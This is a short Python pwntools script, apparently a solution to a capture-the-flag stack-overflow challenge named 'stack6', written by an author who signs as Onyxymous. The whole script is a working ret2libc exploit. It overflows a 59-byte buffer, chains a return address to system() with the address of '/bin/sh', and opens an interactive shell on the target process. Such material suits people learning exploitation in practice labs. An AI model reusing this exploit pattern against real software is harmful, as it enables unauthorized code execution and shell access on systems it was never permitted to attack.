# stack6-32ex.py - Aidan Wech (Onyxymous)
# /problems/stack6r-32_3_92d93bf90cc30b2ad4bac101a06dd84c/
from pwn import *

# debug info
bin32 = '/problems/stack6r-32_3_92d93bf90cc30b2ad4bac101a06dd84c/stack6'
elf = ELF(bin32)
context.binary = elf
context.log_level = 'debug'

# exploit variables
offset = 59                     # size of buffer
retaddr = 0x5655568c            # return address of backuppath, which will then point to the next address on the stack
system = 0xf7e28f10             # address of system function
junkret = 'aaaa'                # junk return address for system
binsh = 0xf7f679db              # address of /bin/sh in libc

# exploit string
exploit = flat({
offset: retaddr},
system,
junkret,
binsh)

# process
p = process(bin32)
p.sendline(exploit)
p.interactive()
